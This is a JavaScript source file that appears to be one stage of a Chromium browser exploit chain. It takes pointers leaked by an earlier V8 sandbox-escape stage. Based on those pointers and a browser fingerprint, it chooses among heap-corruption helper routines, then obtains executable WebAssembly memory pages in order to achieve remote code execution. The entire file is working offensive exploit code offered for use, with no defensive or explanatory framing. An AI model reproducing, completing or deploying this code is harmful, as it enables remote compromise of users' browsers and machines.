// Achieve code execution
// Automatically choose a strategy, depending on available leaked pointers
// Rely on the RWX helpers
{
    // The following values may (or not) be set by the V8 sbx escape exploit
    var CHROME_DLL_ADDR;       // chrome.dll base address
    var WASM_RWX_ADDR;         // pointer to a RWX memory page from a WASM module
    var WASM_RWX_CALLER;       // callable to the RWX memory page from a WASM module
    var ISOLATE_ADDR;          // isolate address
    var SANDBOX_BASE;          // heap sandbox base address
    var TRUSTED_CAGE_LEAK;     // raw pointer to an object in the trusted cage
    var TRUSTED_CAGE_BASE;     // trusted cage base address
    var TRUSTED_PTR_TABLE;     // trusted pointer table value


    // Include the RWX helpers
    var _RWX_HELPERS;
    if (typeof _RWX_HELPERS === "undefined") {
        _RWX_HELPERS = {};
    }


    // Choose a strategy to achieve RCE
    // Before M122, this is not required as WASM instances are in the sandbox
    // On 32-bit architectures, the V8 sandbox is disabled
    if (((FINGERPRINT.browser.chromium_version.major ?? 122) >= 122) && FINGERPRINT.platform.bitness !== "32") {
        let exists = (obj) => { return !(typeof(obj) === "undefined") };
        while (!exists(TRUSTED_PTR_TABLE)) {
            if (exists(ISOLATE_ADDR) && (exists(TRUSTED_CAGE_BASE) || exists(TRUSTED_CAGE_LEAK)))
                _RWX_HELPERS.isolateToPtrTable();
            else if (exists(WASM_RWX_ADDR) && exists(WASM_RWX_CALLER) && (FINGERPRINT.platform.arch ?? "x64") === "x64")
                _RWX_HELPERS.wasmRWXToCages();
            else if (exists(TRUSTED_CAGE_LEAK) && (FINGERPRINT.platform.arch ?? "x64") === "x64")
                _RWX_HELPERS.huntRWX();
            else if (exists(CHROME_DLL_ADDR))
                _RWX_HELPERS.chromeToIsolate();
            else if ((FINGERPRINT.platform.os ?? "Windows") === "Windows")
                _RWX_HELPERS.partitionAllocMetadata();
            else
                throw "[-] Unable to achieve RCE: pointers leaks required";
        }
    }


    // Retrieve a RWX pointer and a corresponding callable (using getWasmRWX())
    // Retrieved JS2WASM function takes n_args arguments and return a result (BigInt)
    // When shared=true, calls to getRWX(n_args, true) with identical n_args will return the same RWX memory page
    let rwx = {};
    let unique_count = Date.now();
    function getRWX(n_args, shared=false) {
        if (shared && n_args in rwx) {
            log(`[+] Using existing RWX stub for ${n_args} args at 0x${hex(rwx[n_args][0])}`, 4);
            return rwx[n_args];
        }

        let sig_in = Array(n_args).fill(kWasmI64);
        let sig_out = [kWasmI64];
        let body = [
            ...wasmI64Const(0x1337deadbeef1337n),
            ...wasmI64Const(!shared ? unique_count++ : 1),
            kExprDrop,
        ];

        let [rwx_addr, func] = getWasmRWX(sig_in, sig_out, body);
        if (shared) rwx[n_args] = [rwx_addr, func];

        log(`[+] Retrieved a ${shared ? "shared " : ""}RWX stub for ${n_args} args at 0x${hex(rwx_addr)}`, 4);
        return [rwx_addr, func];
    }


    log("[+] Achieved reliable code execution", 1);
}
